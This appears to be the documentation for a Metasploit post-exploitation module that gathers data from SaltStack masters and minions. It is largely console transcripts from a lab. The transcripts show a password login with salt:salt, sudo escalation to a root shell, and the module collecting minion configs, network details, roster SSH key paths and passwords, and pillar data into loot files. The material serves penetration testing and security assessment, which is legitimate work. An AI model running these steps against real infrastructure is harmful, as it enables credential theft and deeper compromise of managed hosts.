## Vulnerable Application

This module gathers data from salt stack minions and masters.

Data gathered from minions:

1. salt minion config file

Data gathered from masters:

1. minion list (denied, pre, rejected, accepted)
1. minion hostname/ip/os (depending on module settings)
1. SLS
1. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed
1. minion config files
1. pillar data

## Verification Steps

1. Install salt and configure it
1. Start msfconsole
1. Get a session with permissions required (root typically)
1. Do: `use post/multi/gather/saltstack`
1. Do: `set session #`
1. Do: `run`
1. You should get all the salt stack info

## Options

### GETHOSTNAME

Gather hostname from the minions. Defaults to `true`

### GETIP

Gather IP from the minions. Defaults to `true`

### GETOS

Gather OS from the minions. Defaults to `true`

## MINIONS

Which minions to gather info from. Defaults to `*` (all)

## Scenarios

### Minion 3002.2 on Ubuntu 20.04

#### Setup

```
[*] Processing salt.rb for ERB directives.
resource (salt.rb)> use auxiliary/scanner/ssh/ssh_login
resource (salt.rb)> set username salt
username => salt
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> set rhosts 3.3.3.3
rhosts => 3.3.3.3
resource (salt.rb)> run
[+] 3.3.3.3:22 - Success: 'salt:salt' 'uid=1000(salt) gid=1000(salt) groups=1000(salt),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd) Linux salt-minion 5.4.0-58-generic #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:34863 -> 3.3.3.3:22) at 2021-04-10 12:50:12 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (salt.rb)> use post/multi/manage/sudo
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> run
[*] SUDO: Attempting to upgrade to UID 0 via sudo
[*] Sudoing with password `salt'.
[+] SUDO: Root shell secured.
[*] Post module execution completed
```

#### Module Run

```
resource (salt.rb)> use post/multi/gather/saltstack
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set verbose true
verbose => true
resource (salt.rb)> run
[!] SESSION may not be compatible with this module.
[*] Looking for salt minion config files
[+] Minion master: 4.4.4.4
[+] 3.3.3.3:22 - minion file successfully retrieved and saved on /root/.msf4/loot/20210410125036_default_3.3.3.3_saltstack_minion_561296.bin
[*] Post module execution completed
msf6 post(multi/gather/saltstack) > cat /root/.msf4/loot/20210410125036_default_3.3.3.3_saltstack_minion_561296.bin
[*] exec: cat /root/.msf4/loot/20210410125036_default_3.3.3.3_saltstack_minion_561296.bin

---
master: 4.4.4.4
```

### Master 3002.2 on Ubuntu 20.04

#### Setup

```
[*] Processing salt.rb for ERB directives.
resource (salt.rb)> use auxiliary/scanner/ssh/ssh_login
resource (salt.rb)> set username salt
username => salt
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> set rhosts 4.4.4.4
rhosts => 4.4.4.4
resource (salt.rb)> run
[+] 4.4.4.4:22 - Success: 'salt:salt' 'uid=1000(salt) gid=1000(salt) groups=1000(salt),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd) Linux salt-master 5.4.0-58-generic #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:35097 -> 4.4.4.4:22) at 2021-04-10 12:11:29 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (salt.rb)> use post/multi/manage/sudo
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set password salt
password => salt
resource (salt.rb)> run
[*] SUDO: Attempting to upgrade to UID 0 via sudo
[*] Sudoing with password `salt'.
[+] SUDO: Root shell secured.
[*] Post module execution completed
```

#### Module Run

```
resource (salt.rb)> use post/multi/gather/saltstack
resource (salt.rb)> set session 1
session => 1
resource (salt.rb)> set verbose true
verbose => true
resource (salt.rb)> run
[!] SESSION may not be compatible with this module.
[*] Attempting to list minions
[*] minions:
- salt-minion
minions_denied: []
minions_pre: []
minions_rejected: []
[+] 4.4.4.4:22 - minion file successfully retrieved and saved to /root/.msf4/loot/20210410130859_default_4.4.4.4_saltstack_minion_619372.bin
[+] Minions List
============

 Status    Minion Name
 ------    -----------
 Accepted  salt-minion

[*] Gathering data from minions
[*] salt-minion:
  network.get_hostname: salt-minion
  network.interfaces:
    ens160:
      hwaddr: aa:aa:aa:aa:aa:aa
      inet:
      - address: 3.3.3.3
        broadcast: 9.9.9.255
        label: ens160
        netmask: 255.255.255.0
      inet6:
      - address: fe80::20c:29ff:aa11:aaa
        prefixlen: '64'
        scope: link
      up: true
    lo:
      hwaddr: 00:00:00:00:00:00
      inet:
      - address: 127.0.0.1
        broadcast: null
        label: lo
        netmask: 255.0.0.0
      inet6:
      - address: ::1
        prefixlen: '128'
        scope: host
      up: true
  status.version: 'Linux version 5.4.0-58-generic (buildd@lcy01-amd64-004) (gcc version
    9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020'
[+] 4.4.4.4:22 - minion data gathering successfully retrieved and saved to /root/.msf4/loot/20210410130901_default_4.4.4.4_saltstack_minion_998932.bin
[+] Found minion: salt-minion (3.3.3.3) - Linux version 5.4.0-58-generic (buildd@lcy01-amd64-004) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020
[*] Showing SLS
[+] 4.4.4.4:22 - SLS output successfully retrieved and saved to /root/.msf4/loot/20210410130904_default_4.4.4.4_saltstack_sls_073612.txt
[*] Loading roster
[+] Found SSH minion: web1 (192.168.42.1)
[+] Found SSH minion: web2 (192.168.42.2)
[+]   SSH key /tmp/id_rsa password hello
[-]   Unable to find salt-ssh priv key /tmp/id_rsa
[+] Found SSH minion: web3 (192.168.42.3)
[-]   Unable to find salt-ssh priv key /tmp/id_rsa2
[*] Looking for salt minion config files
[+] 4.4.4.4:22 - roster file successfully retrieved and saved to /root/.msf4/loot/20210410130908_default_4.4.4.4_saltstack_roster_162455.bin
[*] Gathering pillar data
[*] salt-minion:
  info: some data
[+] 4.4.4.4:22 - pillar data gathering successfully retrieved and saved to /root/.msf4/loot/20210410130910_default_4.4.4.4_saltstack_pillar_773785.bin
{"salt-minion"=>{"info"=>"some data"}}
[*] Post module execution completed
```
